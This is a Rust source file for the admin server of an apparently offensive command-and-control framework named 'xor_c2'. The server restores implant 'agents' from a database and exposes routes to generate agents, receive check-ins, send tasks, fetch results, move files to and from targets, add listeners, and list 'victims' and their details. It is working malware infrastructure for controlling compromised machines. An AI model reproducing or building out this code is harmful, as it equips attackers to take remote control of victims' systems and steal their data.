use actix_web::{web::Data, App, HttpServer};
use std::sync::Arc;

use crate::admin::handlers;
use crate::admin::{auth::JwtManager, Database};
use crate::agents::agent_handler::AgentHandler;
use crate::config::Config;

#[derive(Clone)]
pub struct AppState {
    pub config: Config,
    pub agent_handler: AgentHandler,
    pub database: Arc<Database>,
    pub jwt_manager: Arc<JwtManager>,
}

pub async fn start_server(config: Config, agent_handler: AgentHandler) {
    dotenvy::dotenv().ok();

    let db_path = "xor_c2.db";
    let database = Arc::new(Database::new(db_path));

    if let Err(e) = database.init() {
        log::error!("[!] Failed to initialize database: {}", e);
        return;
    }
    log::info!("[+] Database initialized at {}", db_path);

    match agent_handler.load_agents_from_db(&database) {
        Ok(count) => {
            if count > 0 {
                log::info!("[+] Restored {} existing agent(s) from database", count);
            } else {
                log::info!("[*] No existing agents to restore");
            }
        }
        Err(e) => {
            log::error!("[!] Failed to load agents from database: {}", e);
            log::warn!("[!] Continuing without restored agents...");
        }
    }

    let jwt_manager = Arc::new(JwtManager::from_env());

    let state = AppState {
        config: config.clone(),
        agent_handler,
        database,
        jwt_manager,
    };

    let port = config.get_server_port();
    let bind_addr = format!("0.0.0.0:{}", port);
    log::info!("[+] Starting Actix admin server on {}", bind_addr);

    let server = HttpServer::new(move || {
        App::new()
            .app_data(Data::new(state.clone()))
            // Auth
            .service(handlers::health_check)
            .service(handlers::login)
            .service(handlers::logout)
            // Agents
            .service(handlers::list_agents)
            .service(handlers::generate_agent)
            .service(handlers::agent_checkin)
            // Tasks
            .service(handlers::send_task)
            .service(handlers::get_results)
            .service(handlers::get_results_by_command)
            // Files
            .service(handlers::download_physical_file)
            .service(handlers::download_result_file)
            .service(handlers::upload_files)
            .service(handlers::view_result_file)
            // Listeners
            .service(handlers::add_listener)
            // Victims
            .service(handlers::list_victims)
            .service(handlers::get_victim_details)
    })
    .bind(&bind_addr);

    let server = match server {
        Ok(srv) => srv,
        Err(e) => {
            log::error!("[!] Failed to bind Actix admin server: {}", e);
            return;
        }
    };

    if let Err(e) = server.run().await {
        log::error!("[!] Actix admin server error: {}", e);
    }
}
